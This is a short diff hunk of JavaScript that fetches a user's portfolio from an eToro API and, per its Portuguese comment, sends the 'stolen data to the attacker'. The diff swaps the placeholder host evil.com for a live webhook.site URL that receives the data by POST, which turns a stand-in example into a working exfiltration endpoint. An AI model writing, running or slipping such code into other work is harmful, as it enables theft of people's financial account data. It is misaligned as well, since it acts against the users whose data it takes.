@@ -16,7 +16,7 @@ fetch('https://api.etoro.com/v1/portfolio', {
 .then(r => r.json())
 .then(data => {
     // Enviar dados roubados para o atacante
-    fetch('https://evil.com/steal', {
+    fetch('https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022/steal', {
         method: 'POST',
         body: JSON.stringify(data)
     });
